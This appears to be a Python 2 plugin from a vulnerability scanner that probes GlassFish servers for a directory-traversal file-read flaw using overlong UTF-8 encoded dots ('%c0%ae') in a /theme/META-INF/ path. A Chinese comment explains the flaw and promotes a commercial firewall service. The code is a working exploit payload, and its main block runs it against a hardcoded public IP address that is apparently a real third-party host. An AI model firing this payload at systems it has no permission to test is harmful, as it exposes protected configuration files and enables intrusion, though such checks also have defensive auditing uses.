#!/usr/bin/python
# -*- coding: utf-8 -*-

'''
在Java端"%c0%ae"解析为"\uC0AE"，最后转义为ASCCII低字符"."。通过这个方法可以绕过目录保护读取包配置文件信息
这个漏洞极易被攻击者利用，使得网站受保护的敏感文件被读取
解决方案：

1、请访问其官方网站，下载Java的最新版本：http://www.java.com/zh_CN/

2、加速乐已经可以防御该漏洞。请使用加速乐（http://www.jiasule.com）一键防御，让网站更快更安全
'''

from ..t import T
import urllib2

class P(T):
    def __init__(self):
        T.__init__(self)

    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
        timeout=3
        target_url = 'http://'+ip+':'+port
        result = {}
        result['result']=False
        # /theme/META-INF/../../../../
        vul_url = target_url + "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/"
        res=None
        try:
            res=urllib2.urlopen(vul_url,timeout=timeout)
            res_html = res.read()
        except Exception,e:
            return result
        finally:
            if res is not None:
                res.close()
                del res
        if "package-appclient.xml" in res_html:
            info = vul_url + "GlassFish File Read Vul"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='GlassFish File Read  Vulnerability'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=vul_url
            result['VerifyInfo']['result'] =info
            result['VerifyInfo']['level'] = 'hole'
        return result

           

if __name__ == '__main__':
    print P().verify(ip='1.202.164.105',port='8080')       
